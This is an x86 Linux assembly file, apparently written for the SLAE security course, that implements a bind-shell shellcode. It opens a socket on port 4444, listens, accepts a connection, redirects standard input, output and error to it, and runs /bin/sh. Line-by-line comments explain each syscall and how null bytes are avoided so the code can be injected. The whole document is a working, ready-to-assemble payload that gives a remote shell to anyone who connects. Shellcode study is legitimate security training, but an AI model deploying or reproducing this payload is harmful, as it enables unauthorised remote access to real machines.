; Title: 	secuid0_Shell_Bind_TCP_Shellcode
; Author: 	Anastasios Monachos (secuid0) - [anastasiosm (at) gmail (dot) com]
; 		SLAE-461

global _start

section .text

_start:

;socket
; From C code: socket_descriptor=socket(AF_INET, SOCK_STREAM, 0);
; From man pages: int socket(int domain, int type, int protocol)
   xor eax, eax   ; zero eax register to hold SYS_socketcall
   mov al, 0x66   ; al has enough space to hold the SYS_socketcall syscall id (102d=0x66) (see /usr/include/i386-linux-gnu/asm/unistd_32.h)
   xor ebx, ebx   ; zero ebx register, ebx will hold the type of socketcall, in this case it will be the SYS_SOCKET
   push ebx       ; See comments (;;;;;;Comment 1;) below 
   mov bl, 0x1    ; bl has enough space to hold SYS_SOCKET, id 1d = 0x1 (see /usr/include/linux/net.h) no need to push it on the stack
                  ;
                  ; int socket(int domain, int type, int protocol)
                  ;     socket(AF_INET, SOCK_STREAM, 0);
                  ; From /usr/include/i386-linux-gnu/bits/socket.h we found that
                  ; AF_INET's id is 2
                  ; From /usr/include/i386-linux-gnu/bits/socket_type.h we found that
                  ; SOCK_STREAM = 1
                  ;
                  ; socket(AF_INET, SOCK_STREAM, 0); 
                  ;   1   (2     ,      1     , 0)
                  ;
   ;;;;;;Comment 1; or use eax or ebx and push the 0 on the stack right after they got xor-ed and before be used, we preferred the latter option.
                  ;
   push byte 0x1  ; push SOCK_STREAM on the stack (SOCK_STREAM = 1). Note: "push dword 1" instruction creates 00
   push byte 0x2  ; push AF_INET on the stack (AF_INET's is defined with id 2). Note: "push dword 2" instruction creates 00 
   mov ecx, esp   ; Save pointer, set ecx to point to the syscall SYS_SOCKET arguments
   int 0x80       ; Invoke SYS_socketcall SYS_SOCKET
   
   mov esi, eax   ; We are storing the value of socket_descriptor into ESI as we will need it later in the SYS_BIND (see "push esi" in ;bind section below)


;bind
;int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
                  ; No need to "xor eax, eax" again, only the AL register we have altered so far, the rest part is still nulled
   mov al, 0x66   ; al has enough space to hold the SYS_socketcall syscall id (102d=0x66) (see /usr/include/i386-linux-gnu/asm/unistd_32.h)
                  ; No need to "xor ebx, ebx" again, only the BL register we have altered so far, the rest part is still nulled
                  ; ebx will hold the type of socketcall, in this case it will be the SYS_BIND
   mov bl, 0x2    ; bl has enough space to hold SYS_SOCKET SYS_BIND id 2d = 0x2 (see /usr/include/linux/net.h)
   xor edx, edx   ; zero edx, to store arguments of struct sockaddr_in
                  ;
                  ; struct sockaddr_in
   push edx       ; INADDR_ANY: as per /usr/include/netinet/in.h     #define INADDR_ANY ((in_addr_t) 0x00000000))
                  ; set to "0" to accept connections from any IPv4 address
   push word 0x5c11    ; LISTENING_PORT in little-endian, we defined it as 4444 = 115c
                  ; Note: If you simply "push 0x5c11" this will create nulls in the shellcode, therefore better use "push word 0x5c11"
   push word 0x2  ; AF_INET: as per /usr/include/i386-linux-gnu/bits/socket.h it is defined as "2"
   mov ecx, esp   ; Save the pointer of struct sockaddr_in arguments
                  ;
                  ; syscall SYS_BIND arguments: (int sockfd, const struct sockaddr *addr, socklen_t addrlen)
   push byte 0x10 ; "socklen_t addrlen", the third argument of syscall SYS_BIND is defined in /usr/include/linux/in.h
                  ; #define __SOCK_SIZE__   16              /* sizeof(struct sockaddr)      */
                  ; 16d = 10 h
   push ecx       ; pointer to struct sockaddr (struct sockaddr_in see also a few line above) this is struct sockaddr_in in our C code
   push esi       ; pointer to the file descriptor sock descriptor (int sockfd) this is socket_descriptor in our C dode. 
                  ; The socket_descriptor=socket(AF_INET, SOCK_STREAM, 0); was constructed in the SYS_SOCKET section 
                  ; (;socket section in assembly code) as such we stored the value of socket_descriptor
                  ; in a register at ;socket section and we are loading it here.
   mov ecx, esp   ; save pointer to arguments, set ecx to point to the syscall SYS_BIND arguments 
   int 0x80       ; Execute SYS_socketcall SYS_BIND


;listen
;int listen(int sockfd, int backlog);
;listen(socket_descriptor,0)
                  ; No need to "xor eax, eax" again, only the AL register we have altered so far, the rest part is still nulled
   mov al, 0x66   ; al has enough space to hold the SYS_socketcall syscall id (102d=0x66) (see /usr/include/i386-linux-gnu/asm/unistd_32.h)
                  ; No need to "xor ebx, ebx" again, only the BL register we have altered so far, the rest part is still nulled
                  ; ebx will hold the type of socketcall, in this case it will be the SYS_LISTEN
   mov bl, 0x4    ; bl has enough space to hold SYS_SOCKET SYS_LISTEN id 4d = 0x4 (see /usr/include/linux/net.h)   
   xor edx, edx   ; set "backlog" parameter to 0
   push edx       ; push "backlog" value on the stack
   push esi       ; push ESI on the stack, ESI is holding a pointer to the file descriptor sock descriptor (int sockfd) 
                  ; -this is socket_descriptor in our C dode- earlier defined in the ;bind section (see previous section)
   mov ecx, esp   ; save pointer to arguments, set ecx to point to the syscall SYS_LISTEN arguments
   int 0x80       ; Execute SYS_socketcall SYS_LISTEN


;accept
;int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
;newsocket_file_descriptor = accept(socket_descriptor, (struct sockaddr *) &client_address, &client_address_length);
                  ; No need to "xor eax, eax" again, only the AL register we have altered so far, the rest part is still nulled
   mov al, 0x66   ; al has enough space to hold the SYS_socketcall syscall id (102d=0x66) (see /usr/include/i386-linux-gnu/asm/unistd_32.h)
                  ; No need to "xor ebx, ebx" again, only the BL register we have altered so far, the rest part is still nulled
                  ; ebx will hold the type of socketcall, in this case it will be the SYS_ACCEPT
   mov bl, 0x5    ; bl has enough space to hold SYS_SOCKET SYS_ACCEPT id 5d = 0x5 (see /usr/include/linux/net.h)
   xor edx, edx   ; Null a register to use with the next arguments
   push edx       ; set the 3rd argument: "socklen_t *addrlen" to 0, due to the NULL value set in the 2nd argument (read below)
   push edx       ; set the 2nd argument: "struct sockaddr *addr" to 0, as per the "man 2 accept" documentation: "When addr is NULL,
                  ; nothing is filled in; in this case, addrlen (this is the 3rd argument) is not used, and should also be NULL.
   push esi       ; set the 1st argument: "socket_descriptor" to ESI
                  ; as ESI is already (see also above ;listen section) holding a pointer to  
                  ; the file descriptor sock descriptor (int sockfd)
   mov ecx, esp   ; save pointer to arguments, set ecx to point to the syscall SYS_ACCEPT arguments
   int 0x80       ; Execute SYS_socketcall SYS_ACCEPT


;;dup2
;int dup2(int oldfd, int newfd);
;dup2(socket_descriptor, _0_1_2 I/O file descriptors)
   mov ebx, eax   ; First backup the EAX register as it contains the oldfd (socket_descriptor)
                  ; the socket_descriptor is needed in dup2 function, as it its 1st argument

   xor eax, eax   ; null EAX to store the syscall for dup2
   xor ecx, ecx   ; null ECX to store dup2's 2nd argument (this is the I/O file descriptor numbers 0-1-2)

dup2_all_io:
   mov al, 0x3F      ; dup2 has syscall id 63d=3Fh
   int 0x80          ; Invoke dup2 syscall
                     ; cl is already zeroed so file descriptor with id 0 (standard Input) will be copied
   inc cl            ; increment cl to copy file descriptor numbers 1 (standard Output) and 2 (standard Error)
   cmp cl, 3         ; check if cl reached 3
   je execve         ; if cl reached 3 jump to execve label
   jmp dup2_all_io   ; else loop again


execve:
;execve
;int execve(const char *filename, char *const argv[], char *const envp[]);
;    execve("/bin/sh",            NULL,               NULL);
;    EAX 11    EBX                  ECX               EDX
;Building up th NULL terminated /bin//sh to be used in EXECVE, we are free to use other registers instead of EAX
   xor eax, eax   ; zeroing DWORD register so to build the null termination
   push eax       ; pushing the register on the stack
   push 0x68732f2f   ; 4 characters --- hs//
   push 0x6e69622f   ; 4 characters --- nib/
                  ; all these are being referenced by ESP as they are on the top of the stack
   mov ebx, esp   ; so we can load them in EBX

;Building up the THIRD (envp) argument of EXECVE
;char *const envp[] in our case should be null
   push eax       ; EAX is already null from the xor
   mov edx, esp   ; char *const envp[] is the 3rd parameter so it has to be stored in EDX
                  ; essentially ESP holds the zero-ed values from the "push eax"
                  ; and we copy the top of the stack (zero-ed) into EDX
                  
;Building up SECOND (argv) argument of EXECVE
; char *const argv[] should be "address_of_bin_bash, null (0x00000000)
   push ebx       ; EBX is already on the stack and holds the address where ////bin/bash,0x0 begins
   mov ecx, esp   ; move the top of the stack to the ECX register

;Invoking EXECVE syscall number
   mov al, 11     ; execve syscall is 11
   int 0x80       ; Invoke syscall
